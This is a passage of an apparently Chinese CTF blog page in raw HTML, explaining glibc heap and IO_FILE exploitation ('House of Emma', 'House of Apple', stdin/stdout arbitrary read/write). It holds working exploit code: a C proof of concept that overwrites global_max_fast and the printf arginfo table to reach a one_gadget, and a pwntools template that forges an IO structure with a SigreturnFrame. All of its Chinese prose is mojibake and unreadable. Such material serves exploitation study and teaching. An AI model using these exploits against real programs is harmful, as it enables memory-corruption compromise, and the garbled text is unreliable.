class="hljs-number">3</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>); <span class="hljs-comment">/* avoid consolidation */</span><br>  <span class="hljs-built_in">free</span>(a[<span class="hljs-number">0</span>]);<br>  libc_base = *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)a[<span class="hljs-number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libc @ 0x%lx\n&quot;</span>, libc_base);<br><br>  <span class="hljs-comment">/* prepare fake printf arginfo table */</span><br>  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)(a[<span class="hljs-number">2</span>] + (<span class="hljs-string">&#x27;X&#x27;</span> - <span class="hljs-number">2</span>) * <span class="hljs-number">8</span>) = libc_base + ONE_GADGET;<br><br>  <span class="hljs-comment">/* unsorted bin attack */</span><br>  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)(a[<span class="hljs-number">0</span>] + <span class="hljs-number">8</span>) = libc_base + GLOBAL_MAX_FAST - <span class="hljs-number">0x10</span>;<br>  a[<span class="hljs-number">0</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>); <span class="hljs-comment">/* overwrite global_max_fast */</span><br><br>  <span class="hljs-comment">/* overwrite __printf_arginfo_table */</span><br>  <span class="hljs-built_in">free</span>(a[<span class="hljs-number">1</span>]);<br>  <span class="hljs-built_in">free</span>(a[<span class="hljs-number">2</span>]);<br><br>  <span class="hljs-comment">/* ignite! */</span><br>  getchar();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%X&quot;</span>, <span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="House-of-Emma"><a class="header-anchor" href="#House-of-Emma">Â¶</a>House of Emma</h3><p>2.24 ä»¥åï¼Œglibc åŠ å…¥äº†å¯¹ IOFILE ç»“æ„ä½“çš„ vtable æ˜¯å¦åœ¨æŒ‡å®šåŒºé—´çš„æ£€æµ‹ã€‚è‡ª 2.27 çš„é«˜ç‰ˆæœ¬èµ·ï¼Œæˆ‘ä»¬å¸¸ç”¨çš„ä¿©ä¸ªå‡½æ•°(_IO_str_overflow ä¸ _IO_str_finish)ä¸­çš„å‡½æ•°æŒ‡é’ˆä¹Ÿè¢«æ›¿æ¢æˆäº† malloc å’Œ freeã€‚äºæ˜¯æˆ‘ä»¬æŠŠç›®å…‰è½¬ç§»åˆ°åˆæ³•åŒºé—´å†…çš„å¯åˆ©ç”¨å‡½æ•°ã€‚</p><h4 id="ä½¿ç”¨åœºæ™¯-v3"><a class="header-anchor" href="#ä½¿ç”¨åœºæ™¯-v3">Â¶</a>ä½¿ç”¨åœºæ™¯</h4><ol><li>å¯ä»¥ä»»æ„å†™ä¸€ä¸ªå¯æ§åœ°å€ï¼ˆLargeBin Attackã€Tcache Stashing Unlink Attackâ€¦ï¼‰</li><li>å¯ä»¥è§¦å‘ IO æµï¼ˆFSOPã€<a href="https://www.anquanke.com/post/id/235598">House OF Kiwi</a>ï¼‰</li></ol><h4 id="åŸç†-v3"><a class="header-anchor" href="#åŸç†-v3">Â¶</a>åŸç†</h4><p>åœ¨ vtable çš„åˆæ³•èŒƒå›´å†…ï¼Œå­˜åœ¨ä¸€ä¸ª _IO_cookie_jumps ï¼Œ _IO_cookie_jumps ä¸­å­˜åœ¨ä¸‹åˆ—å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br>_IO_cookie_read (FILE *fp, <span class="hljs-type">void</span> *buf, <span class="hljs-type">ssize_t</span> size)<br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_cookie_file</span> *<span class="hljs-title">cfile</span> =</span> (<span class="hljs-keyword">struct</span> _IO_cookie_file *) fp;<br>  <span class="hljs-type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (read_cb);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">if</span> (read_cb == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>  <span class="hljs-keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br>_IO_cookie_write (FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">ssize_t</span> size)<br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_cookie_file</span> *<span class="hljs-title">cfile</span> =</span> (<span class="hljs-keyword">struct</span> _IO_cookie_file *) fp;<br>  <span class="hljs-type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (write_cb);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">if</span> (write_cb == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      fp-&gt;_flags |= _IO_ERR_SEEN;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>  <span class="hljs-type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);<br>  <span class="hljs-keyword">if</span> (n &lt; size)<br>    fp-&gt;_flags |= _IO_ERR_SEEN;<br><br>  <span class="hljs-keyword">return</span> n;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè°ƒç”¨çš„å‡½æ•°æŒ‡é’ˆ <code>read_cb</code> å’Œ <code>write_cb</code> å’Œ 2.27 ç‰ˆæœ¬çš„åˆ©ç”¨ä¸€æ ·ï¼Œéƒ½æ˜¯ä»¥ IOFILE ç»“æ„ä½“ä¸ºåŸºå¯»å€çš„ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ˜“çš„æ§åˆ¶è¿™äº›å‡½æ•°æŒ‡é’ˆã€‚</p><p>å¯æƒœçš„æ˜¯ï¼Œå¹¶æ²¡æœ‰ 2.27 ç‰ˆæœ¬é‚£ä¹ˆç®€å•ï¼Œå¦‚ä¸Šä»£ç ä¸­å­˜åœ¨ä»¥ä¸‹ä¿æŠ¤ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (write_cb);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>æ€»æ‰€å‘¨çŸ¥ï¼Œglibc é‡Œé¢çš„å®éƒ½æ˜¯æ¯”è¾ƒæŠ½è±¡çš„ï¼Œè¿™ä¸ªåœ°æ–¹æœ€å¥½è¿˜æ˜¯ç»“åˆè°ƒè¯•æ¥çœ‹ï¼š</p><p>çœ‹ä¸åˆ°å°±æ˜¯è¿˜åœ¨å’•ã€‚</p><hr><h3 id="House-of-Apple"><a class="header-anchor" href="#House-of-Apple">Â¶</a>House of Apple</h3><p>å…¶å®æœ‰äº† apple ä¹‹åï¼Œå…¶ä»–çš„åè€Œæ˜¾å¾—æ²¡é‚£ä¹ˆé‡è¦äº†ï¼Œæš‚æ—¶ IOFILE ç³»åˆ—å°±æç½®åœ¨è¿™äº†ï¼Œä»¥åå†æ›´~ è¿˜æ˜¯å…ˆæ”¾ä¸ªæ¨¡æ¿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">_IO_wfile_jumps = libc_base + <span class="hljs-number">0x2160c0</span><br>target_chunk = heap_base + <span class="hljs-number">0xcf0</span><br>addr = target_chunk + <span class="hljs-number">0x200</span><br>fake_frame = SigreturnFrame()<br>fake_frame.rdi = <span class="hljs-number">0</span><br>fake_frame.rsi = addr<br>fake_frame.rdx = <span class="hljs-number">0x300</span><br>fake_frame.rsp = addr<br>fake_frame.rip = libc.sym.read<br>fake_io = <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>fake_io = fake_io.ljust(<span class="hljs-number">0x88</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_io += p64(target_chunk+<span class="hljs-number">0x30</span>)<br>fake_io = fake_io.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_io += p64(target_chunk+<span class="hljs-number">0xd0</span>)   <span class="hljs-comment"># RDX</span><br>fake_io = fake_io.ljust(<span class="hljs-number">0xd8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_io += p64(_IO_wfile_jumps)<br>fake_io += <span class="hljs-built_in">str</span>(fake_frame)[:<span class="hljs-number">0xe0</span>]<br>fake_io += p64(target_chunk+<span class="hljs-number">0xd0</span>+<span class="hljs-number">0xe0</span>+<span class="hljs-number">8</span>-<span class="hljs-number">0x68</span>) + p64(magic)<br>edit(<span class="hljs-number">2</span>,fake_io[<span class="hljs-number">0x10</span>:])<br>menu(<span class="hljs-number">0</span>)<br>rop_chain = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span><br>sleep(<span class="hljs-number">1</span>)<br>sl(rop_chain)<br></code></pre></td></tr></table></figure><hr><p>ä¸‹é¢çš„ stdin/stdout ç›¸å…³æ¬è¿è‡ª <a href="https://bbs.pediy.com/thread-272098.htm">CTF ä¸­ glibcå †åˆ©ç”¨ åŠ IO_FILE æ€»ç»“ - winmt </a> XDã€‚</p><h2 id="stdin-ä»»æ„å†™"><a class="header-anchor" href="#stdin-ä»»æ„å†™">Â¶</a>stdin ä»»æ„å†™</h2><p><strong>æ³¨æ„</strong>ï¼š<code>scanf</code>ï¼Œ<code>fread</code>ï¼Œ<code>gets</code>ç­‰è¯»å…¥èµ°<code>IO</code>æŒ‡é’ˆï¼ˆ<code>read</code>ä¸èµ°ï¼‰ã€‚<br><strong>å¤§ä½“æµç¨‹</strong>ä¸ºï¼šè‹¥<code>_IO_buf_base</code>ä¸ºç©ºï¼Œåˆ™è°ƒç”¨<code>_IO_doallocbuf</code>å»åˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒºï¼Œç„¶ååˆ¤æ–­è¾“å…¥ç¼“å†²åŒºæ˜¯å¦å­˜åœ¨å‰©ä½™æ•°æ®ï¼Œå¦‚æœè¾“å…¥ç¼“å†²åŒºæœ‰å‰©ä½™æ•°æ®ï¼ˆ<code>_IO_read_end &gt; _IO_read_ptr</code>ï¼‰åˆ™å°†å…¶<strong>ç›´æ¥æ‹·è´è‡³ç›®æ ‡åœ°å€</strong>ï¼ˆä¸ä¼šå¯¹æ­¤æ—¶è¾“å…¥çš„æ•°æ®è¿›è¡Œè¯»å…¥ï¼‰ï¼Œå¦‚æœæ²¡æœ‰æˆ–ä¸å¤Ÿï¼Œåˆ™è°ƒç”¨<code>__underflow</code>å‡½æ•°<strong>æ‰§è¡Œç³»ç»Ÿè°ƒç”¨è¯»å–æ•°æ®</strong>ï¼ˆ<code>SYS_read</code>ï¼‰åˆ°è¾“å…¥ç¼“å†²åŒºï¼ˆä»<code>_IO_buf_base</code>åˆ°<code>_IO_buf_end</code>ï¼Œé»˜è®¤<code>0x400</code>ï¼Œå³å°†æ•°æ®è¯»åˆ°<code>_IO_buf_base</code>ï¼Œè¯»å–<code>0x400</code>ä¸ªå­—èŠ‚ï¼‰ï¼Œæ­¤æ—¶è‹¥å®é™…è¯»å…¥äº†<code>n</code>ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œåˆ™<code>_IO_read_end = _IO_buf_base + n</code>ï¼ˆå³<code>_IO_read_end</code>æŒ‡å‘å®é™…è¯»å…¥çš„æœ€åä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ï¼‰ï¼Œä¹‹åå†å°†è¾“å…¥ç¼“å†²åŒºä¸­çš„æ•°æ®æ‹·è´åˆ°ç›®æ ‡åœ°å€ã€‚<br>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè‹¥è¾“å…¥ç¼“å†²åŒºä¸­æ²¡æœ‰å‰©ä½™çš„æ•°æ®ï¼Œåˆ™æ¯æ¬¡è¯»å…¥æ•°æ®è¿›è¾“å…¥ç¼“å†²åŒºï¼Œä»…å’Œ<code>_IO_buf_base</code>ä¸<code>_IO_buf_end</code>æœ‰å…³ã€‚<br>åœ¨å°†æ•°æ®ä»è¾“å…¥ç¼“å†²åŒºæ‹·è´åˆ°ç›®æ ‡åœ°å€çš„è¿‡ç¨‹ä¸­ï¼Œ<strong>éœ€è¦æ»¡è¶³æ‰€è°ƒç”¨çš„è¯»å…¥å‡½æ•°çš„è‡ªèº«çš„é™åˆ¶æ¡ä»¶</strong>ï¼Œä¾‹å¦‚ï¼šä½¿ç”¨<code>scanf(&quot;%d&quot;,&amp;a)</code>è¯»å…¥æ•´æ•°ï¼Œåˆ™å½“åœ¨è¾“å…¥ç¼“å†²åŒºä¸­é‡åˆ°äº†å­—ç¬¦ï¼ˆæˆ–<code>scanf</code>çš„ä¸€äº›æˆªæ–­ç¬¦ï¼‰ç­‰ä¸ç¬¦åˆçš„æƒ…å†µï¼Œå°±ä¼šåœæ­¢è¿™ä¸ªæ‹·è´çš„è¿‡ç¨‹ã€‚æœ€ç»ˆï¼Œ<code>_IO_read_ptr</code>æŒ‡å‘æˆåŠŸæ‹·è´åˆ°ç›®çš„åœ°å€ä¸­çš„æœ€åä¸€ä¸ªå­—èŠ‚æ•°æ®åœ¨è¾“å…¥ç¼“å†²åŒºä¸­çš„åœ°å€ã€‚å› æ­¤ï¼Œè‹¥æ˜¯é‡åˆ°äº†ä¸ç¬¦åˆé™åˆ¶æ¡ä»¶çš„æƒ…å†µè€Œç»ˆæ­¢æ‹·è´ï¼Œåˆ™æœ€ç»ˆä¼šä½¿å¾—<code>_IO_read_end &gt; _IO_read_ptr</code>ï¼Œå³å†ä¸‹ä¸€æ¬¡è¯»å…¥ä¹‹å‰ä¼šè¢«è®¤å®šä¸ºè¾“å…¥ç¼“å†²åŒºä¸­ä»æœ‰å‰©ä½™æ•°æ®ï¼Œåœ¨æ­¤æƒ…å†µä¸‹ï¼Œ<strong>å¾ˆæœ‰å¯èƒ½ä¸ä¼šè¿›è¡Œæ­¤æ¬¡è¯»å…¥</strong>ï¼Œæˆ–å°†è¾“å…¥ç¼“å†²åŒºä¸­å‰©ä½™çš„æ•°æ®æ‹·è´åˆ°æ­¤æ¬¡è¯»å…¥çš„ç›®æ ‡åœ°å€ï¼Œä»è€Œ<strong>å¯¼è‡´è¯»å…¥çš„é”™è¯¯</strong>ã€‚<br><code>getchar()</code>å’Œ<code>IO_getc()</code>çš„ä½œç”¨æ˜¯åˆ·æ–°<code>_IO_read_ptr</code>ï¼Œæ¯æ¬¡è°ƒç”¨ï¼Œä¼šä»è¾“å…¥ç¼“å†²åŒºè¯»ä¸€ä¸ªå­—èŠ‚æ•°æ®ï¼Œå³å°†<code>_IO_read_ptr++</code>ã€‚</p><h3 id="ç›¸å…³æºç "><a class="header-anchor" href="#ç›¸å…³æºç ">Â¶</a><strong>ç›¸å…³æºç </strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_size_t _IO_file_xsgetn (_IO_FILE *fp, <span class="hljs-type">void</span> *data, _IO_size_t n)<br>&#123;<br> ...<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      ...<br>      <span class="hljs-comment">//è¾“å…¥ç¼“å†²åŒºä¸ºç©ºåˆ™åˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒº</span><br>    &#125;<br>  <span class="hljs-keyword">while</span> (want &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;<br>      <span class="hljs-keyword">if</span> (have &gt; <span class="hljs-number">0</span>)<br>        &#123;<br>          ...<br>          <span class="hljs-comment">//memcpy</span><br> <br>        &#125;<br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>          &amp;&amp; want &lt; (<span class="hljs-type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>        &#123;<br>          <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)  <span class="hljs-comment">// è°ƒç”¨__underflowè¯»å…¥æ•°æ®</span><br>          ...<br>        &#125;<br>      ...<br>  <span class="hljs-keyword">return</span> n - want;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> _IO_new_file_underflow (_IO_FILE *fp)<br>&#123;<br>  _IO_ssize_t count;<br>  ...<br>  <span class="hljs-comment">// ä¼šæ£€æŸ¥_flagsæ˜¯å¦åŒ…å«_IO_NO_READSæ ‡å¿—ï¼ŒåŒ…å«åˆ™ç›´æ¥è¿”å›ã€‚</span><br>  <span class="hljs-comment">// æ ‡å¿—çš„å®šä¹‰æ˜¯#define _IO_NO_READS 4ï¼Œå› æ­¤_flagsä¸èƒ½åŒ…å«4ã€‚</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)<br>    &#123;<br>      fp-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-comment">// å¦‚æœè¾“å…¥ç¼“å†²åŒºé‡Œå­˜åœ¨æ•°æ®ï¼Œåˆ™ç›´æ¥è¿”å›</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br>  ...<br>  <span class="hljs-comment">// è°ƒç”¨_IO_SYSREADå‡½æ•°æœ€ç»ˆæ‰§è¡Œç³»ç»Ÿè°ƒç”¨è¯»å–æ•°æ®</span><br>  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,<br>               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<br>  ...<br>&#125;<br>libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)<br></code></pre></td></tr></table></figure><p>ç»¼ä¸Šï¼Œ<strong>stdin</strong> ä¸ºäº†åšåˆ°<strong>ä»»æ„å†™</strong>ï¼Œæ»¡è¶³å¦‚ä¸‹æ¡ä»¶ï¼Œå³å¯è¿›è¡Œåˆ©ç”¨ï¼š<br>(1) è®¾ç½®<code>_IO_read_end</code>ç­‰äº<code>_IO_read_ptr</code>ï¼ˆä½¿å¾—è¾“å…¥ç¼“å†²åŒºå†…æ²¡æœ‰å‰©ä½™æ•°æ®ï¼Œä»è€Œå¯ä»¥ä»ç”¨æˆ·è¯»å…¥æ•°æ®ï¼‰ã€‚<br>(2) è®¾ç½®<code>_flag &amp;~ _IO_NO_READS</code>å³<code>_flag &amp;~ 0x4</code>ï¼ˆä¸€èˆ¬ä¸ç”¨ç‰¹æ„è®¾ç½®ï¼‰ã€‚<br>(3) è®¾ç½®<code>_fileno</code>ä¸º<code>0</code>ï¼ˆä¸€èˆ¬ä¸ç”¨ç‰¹æ„è®¾ç½®ï¼‰ã€‚<br>(4) è®¾ç½®<code>_IO_buf_base</code>ä¸º<code>write_start</code>ï¼Œ<code>_IO_buf_end</code>ä¸º<code>write_end</code>ï¼ˆæˆ‘ä»¬ç›®æ ‡å†™çš„èµ·å§‹åœ°å€æ˜¯<code>write_start</code>ï¼Œå†™ç»“æŸåœ°å€ä¸º<code>write_end</code>ï¼‰ï¼Œä¸”ä½¿å¾—<code>_IO_buf_end-_IO_buf_base</code>å¤§äºè¦å†™å…¥çš„æ•°æ®é•¿åº¦ã€‚</p><h2 id="stdout-ä»»æ„è¯»å†™"><a class="header-anchor" href="#stdout-ä»»æ„è¯»å†™">Â¶</a>stdout ä»»æ„è¯»å†™</h2><p><strong>æ³¨æ„</strong>ï¼š<code>printf</code>ï¼Œ<code>fwrite</code>ï¼Œ<code>puts</code>ç­‰è¾“å‡ºèµ°<code>IO</code>æŒ‡é’ˆï¼ˆ<code>write</code>ä¸èµ°ï¼‰ã€‚<br>åœ¨<code>_IO_2_1_stdout_</code>ä¸­ï¼Œ<code>_IO_buf_base</code>å’Œ<code>_IO_buf_end</code>ä¸ºè¾“å‡ºç¼“å†²åŒºèµ·å§‹ä½ç½®ï¼ˆé»˜è®¤å¤§å°ä¸º<code>0x400</code>ï¼‰ï¼Œåœ¨è¾“å‡ºçš„è¿‡ç¨‹ä¸­ï¼Œä¼šå…ˆå°†éœ€è¦è¾“å‡ºçš„æ•°æ®ä»ç›®æ ‡åœ°å€æ‹·è´åˆ°è¾“å‡ºç¼“å†²åŒºï¼Œå†ä»è¾“å‡ºç¼“å†²åŒºè¾“å‡ºç»™ç”¨æˆ·ã€‚<br>ç¼“å†²åŒºå»ºç«‹å‡½æ•°<code>_IO_doallocbuf</code>ä¼šå»ºç«‹è¾“å‡ºç¼“å†²åŒºï¼Œå¹¶æŠŠåŸºåœ°å€ä¿å­˜åœ¨<code>_IO_buf_base</code>ä¸­ï¼Œç»“æŸåœ°å€ä¿å­˜åœ¨<code>_IO_buf_end</code>ä¸­ã€‚åœ¨å»ºç«‹é‡Œè¾“å‡ºç¼“å†²åŒºåï¼Œä¼šå°†åŸºå€å€ç»™<code>_IO_write_base</code>ï¼Œè‹¥æ˜¯è®¾ç½®çš„æ˜¯å…¨ç¼“å†²æ¨¡å¼<code>_IO_FULL_BUF</code>ï¼Œåˆ™ä¼šå°†ç»“æŸåœ°å€ç»™<code>_IO_write_end</code>ï¼Œè‹¥æ˜¯è®¾ç½®çš„æ˜¯è¡Œç¼“å†²æ¨¡å¼<code>_IO_LINE_BUF</code>ï¼Œåˆ™<code>_IO_write_end</code>ä¸­å­˜çš„æ˜¯<code>_IO_buf_base</code>ï¼Œæ­¤å¤–ï¼Œ<code>_IO_write_ptr</code>è¡¨ç¤ºè¾“å‡ºç¼“å†²åŒºä¸­å·²ç»ä½¿ç”¨åˆ°çš„åœ°å€ã€‚å³<code>_IO_write_base</code>åˆ°<code>_IO_write_ptr</code>ä¹‹é—´çš„ç©ºé—´æ˜¯å·²ç»ä½¿ç”¨çš„ç¼“å†²åŒºï¼Œ<code>_IO_write_ptr</code>åˆ°<code>_IO_write_end</code>ä¹‹é—´ä¸ºå‰©ä½™çš„è¾“å‡ºç¼“å†²åŒºã€‚<br>æœ€ç»ˆå®é™…è°ƒç”¨äº†<code>_IO_2_1_stdout_</code>çš„<code>vtable</code>ä¸­çš„<code>_xsputn</code>ï¼Œä¹Ÿå°±æ˜¯<code>_IO_new_file_xsputn</code>å‡½æ•°ï¼Œæºç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c">IO_size_t _IO_new_file_xsputn (_IO_FILE *f, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *data, _IO_size_t n)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) data;<br>  _IO_size_t to_do = n;<br>  <span class="hljs-type">int</span> must_flush = <span class="hljs-number">0</span>;<br>  _IO_size_t count = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> (n &lt;= <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))<br>    &#123; <span class="hljs-comment">//å¦‚æœæ˜¯è¡Œç¼“å†²æ¨¡å¼...</span><br>      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr; <span class="hljs-comment">//åˆ¤æ–­è¾“å‡ºç¼“å†²åŒºè¿˜æœ‰å¤šå°‘ç©ºé—´</span><br>      <span class="hljs-keyword">if</span> (count &gt;= n)<br>        &#123;<br>          <span class="hljs-type">const</span> <span class="hljs-type">char</span> *p;<br>          <span class="hljs-keyword">for</span> (p = s + n; p &gt; s; )<br>            &#123;<br>              <span class="hljs-keyword">if</span> (*--p == <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment">//æœ€åä¸€ä¸ªæ¢è¡Œç¬¦\nä¸ºæˆªæ–­ç¬¦ï¼Œä¸”éœ€è¦åˆ·æ–°è¾“å‡ºç¼“å†²åŒº</span><br>                &#123;<br>                  count = p - s + <span class="hljs-number">1</span>;<br>                  must_flush = <span class="hljs-number">1</span>; <span class="hljs-comment">//æ ‡å¿—ä¸ºçœŸï¼šéœ€è¦åˆ·æ–°è¾“å‡ºç¼“å†²åŒº</span><br>                  <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr) <span class="hljs-comment">//åˆ¤æ–­è¾“å‡ºç¼“å†²åŒºè¿˜æœ‰å¤šå°‘ç©ºé—´ï¼ˆå…¨ç¼“å†²æ¨¡å¼ï¼‰</span><br>    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;<br>  <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      <span 